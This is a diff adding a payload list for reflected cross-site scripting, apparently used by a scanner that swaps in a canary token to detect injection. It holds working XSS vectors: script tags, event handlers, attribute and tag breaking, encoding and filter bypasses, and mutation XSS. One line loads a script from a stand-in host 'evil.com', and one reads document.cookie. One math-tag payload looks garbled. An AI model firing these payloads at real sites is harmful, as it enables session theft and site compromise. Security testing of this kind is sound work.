@@ -1,0 +1,170 @@
+# Reflected XSS Payloads
+# {{CANARY}} will be replaced with a unique canary token
+
+# === Basic Script Tags ===
+<script>alert('{{CANARY}}')</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script src=//evil.com></script>
+<script>alert`{{CANARY}}`</script>
+<script>confirm('{{CANARY}}')</script>
+<script>prompt('{{CANARY}}')</script>
+<script>{alert('{{CANARY}}')}</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+# === Event Handlers - Images ===
+<img src=x onerror=alert('{{CANARY}}')>
+<img src=x onerror="alert('{{CANARY}}')">
+<img/src=x onerror=alert('{{CANARY}}')>
+<img src=x onerror=alert`{{CANARY}}`>
+<img src=x onerror=alert(1)//
+<img src="x`>`><img src=x onerror=alert('{{CANARY}}')>
+
+# === Event Handlers - SVG ===
+<svg onload=alert('{{CANARY}}')>
+<svg/onload=alert('{{CANARY}}')>
+<svg onload=alert`{{CANARY}}`>
+<svg><script>alert('{{CANARY}}')</script></svg>
+<svg><animate onbegin=alert('{{CANARY}}') attributeName=x dur=1s>
+<svg><set onbegin=alert('{{CANARY}}') attributeName=x to=1>
+
+# === Event Handlers - Input/Focus ===
+<input onfocus=alert('{{CANARY}}') autofocus>
+<input onblur=alert('{{CANARY}}') autofocus><input autofocus>
+<input type=image src=x onerror=alert('{{CANARY}}')>
+<select onfocus=alert('{{CANARY}}') autofocus>
+<textarea onfocus=alert('{{CANARY}}') autofocus>
+<keygen onfocus=alert('{{CANARY}}') autofocus>
+<input type=text value="" onfocus=alert('{{CANARY}}') autofocus>
+
+# === Event Handlers - Media ===
+<video src=x onerror=alert('{{CANARY}}')>
+<video><source onerror=alert('{{CANARY}}')>
+<audio src=x onerror=alert('{{CANARY}}')>
+<audio><source onerror=alert('{{CANARY}}')>
+
+# === Event Handlers - Body/Misc ===
+<body onload=alert('{{CANARY}}')>
+<body onpageshow=alert('{{CANARY}}')>
+<body onfocus=alert('{{CANARY}}')>
+<iframe onload=alert('{{CANARY}}')>
+<iframe src="javascript:alert('{{CANARY}}')">
+<object onerror=alert('{{CANARY}}')>
+<object data="javascript:alert('{{CANARY}}')">
+<embed src="javascript:alert('{{CANARY}}')">
+<marquee onstart=alert('{{CANARY}}')>
+<details open ontoggle=alert('{{CANARY}}')>
+<details/open/ontoggle=alert('{{CANARY}}')>
+<meter onmouseover=alert('{{CANARY}}')>0</meter>
+<div onmouseover=alert('{{CANARY}}')>hover here</div>
+<div onpointerover=alert('{{CANARY}}')>hover here</div>
+
+# === Attribute Injection (Double Quote Context) ===
+" onmouseover="alert('{{CANARY}}')" x="
+" onfocus="alert('{{CANARY}}')" autofocus x="
+" onmouseenter="alert('{{CANARY}}')" x="
+" onclick="alert('{{CANARY}}')" x="
+" onmousemove="alert('{{CANARY}}')" x="
+" onkeydown="alert('{{CANARY}}')" x="
+" onkeyup="alert('{{CANARY}}')" x="
+" onkeypress="alert('{{CANARY}}')" x="
+" onfocusin="alert('{{CANARY}}')" autofocus x="
+" oncontextmenu="alert('{{CANARY}}')" x="
+" ondblclick="alert('{{CANARY}}')" x="
+"autofocus onfocus="alert('{{CANARY}}')"
+"><img src=x onerror=alert('{{CANARY}}')>
+"><svg onload=alert('{{CANARY}}')>
+"><script>alert('{{CANARY}}')</script>
+
+# === Attribute Injection (Single Quote Context) ===
+' onmouseover='alert(String.fromCharCode(88,83,83))' x='
+' onfocus='alert(1)' autofocus x='
+'><img src=x onerror=alert('{{CANARY}}')>
+'><script>alert('{{CANARY}}')</script>
+'><svg onload=alert('{{CANARY}}')>
+
+# === Attribute Injection (No Quote Context) ===
+ onmouseover=alert('{{CANARY}}')
+ onfocus=alert('{{CANARY}}') autofocus
+ onclick=alert('{{CANARY}}')
+
+# === Tag Breaking ===
+"><script>alert('{{CANARY}}')</script>
+'><script>alert('{{CANARY}}')</script>
+</script><script>alert('{{CANARY}}')</script>
+</title><script>alert('{{CANARY}}')</script>
+</textarea><script>alert('{{CANARY}}')</script>
+</style><script>alert('{{CANARY}}')</script>
+</noscript><script>alert('{{CANARY}}')</script>
+</select><script>alert('{{CANARY}}')</script>
+</template><script>alert('{{CANARY}}')</script>
+--><script>alert('{{CANARY}}')</script><!--
+
+# === No Parentheses / Alternate Syntax ===
+<script>alert`{{CANARY}}`</script>
+<script>onerror=alert;throw'{{CANARY}}'</script>
+<script>throw onerror=alert,'{{CANARY}}'</script>
+<script>{onerror=alert}throw'{{CANARY}}'</script>
+<script>alert?.('{{CANARY}}')</script>
+<img src=x onerror="window['alert']('{{CANARY}}')">
+<img src=x onerror="self['alert']('{{CANARY}}')">
+<img src=x onerror="top['alert']('{{CANARY}}')">
+<img src=x onerror=alert&lpar;'{{CANARY}}'&rpar;>
+
+# === JavaScript Protocol ===
+javascript:alert('{{CANARY}}')
+javascript:alert(String.fromCharCode(88,83,83))
+javascript:/*-/*`/*\`/*'/*"/**/(/**/alert('{{CANARY}}'))
+
+# === Data URI ===
+<a href="data:text/html,<script>alert('{{CANARY}}')</script>">click</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+
+# === Template / Framework Injection ===
+{{constructor.constructor('alert(1)')()}}
+${alert('{{CANARY}}')}
+#{alert('{{CANARY}}')}
+<%= alert('{{CANARY}}') %>
+
+# === Comment Breaking ===
+--><script>alert('{{CANARY}}')</script><!--
+--!><script>alert('{{CANARY}}')</script>
+
+# === CSS Injection / Style ===
+<div style="background:url(javascript:alert('{{CANARY}}'))">
+<div style=width:expression(alert('{{CANARY}}'))>
+
+# === Filter Bypass: Case Variations ===
+<ScRiPt>alert('{{CANARY}}')</ScRiPt>
+<IMG SRC=x ONERROR=alert('{{CANARY}}')>
+<SVG ONLOAD=alert('{{CANARY}}')>
+
+# === Filter Bypass: Null Bytes / Whitespace ===
+<scr\x00ipt>alert('{{CANARY}}')</script>
+<img src=x onerror\x09=alert('{{CANARY}}')>
+<img src=x onerror\x0a=alert('{{CANARY}}')>
+<img src=x onerror\x0d=alert('{{CANARY}}')>
+
+# === Filter Bypass: HTML Encoding ===
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;{{CANARY}}&#39;&#41;>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert('{{CANARY}}')">click</a>
+
+# === Filter Bypass: Concatenation ===
+<script>eval('al'+'ert("{{CANARY}}")')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>setTimeout('alert("{{CANARY}}")')</script>
+<script>setInterval('alert("{{CANARY}}")',0)</script>
+<script>[].constructor.constructor('alert("{{CANARY}}")')()</script>
+
+# === Filter Bypass: Tag Mutation ===
+<x onclick=alert('{{CANARY}}') x>click
+<x/onclick=alert('{{CANARY}}')>click
+<x contenteditable onblur=alert('{{CANARY}}')>click
+<x tabindex=1 onfocus=alert('{{CANARY}}')></x>
+<math><mi//telerik//telerik//on=1telerik/telerikonfocus=alert('{{CANARY}}')//telerik/telerik//></math>
+
+# === Mutation XSS (mXSS) ===
+<listing>&lt;img src=1 onerror=alert('{{CANARY}}')&gt;</listing>
+<noscript><p title="</noscript><img src=x onerror=alert('{{CANARY}}')>">
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('{{CANARY}}')>
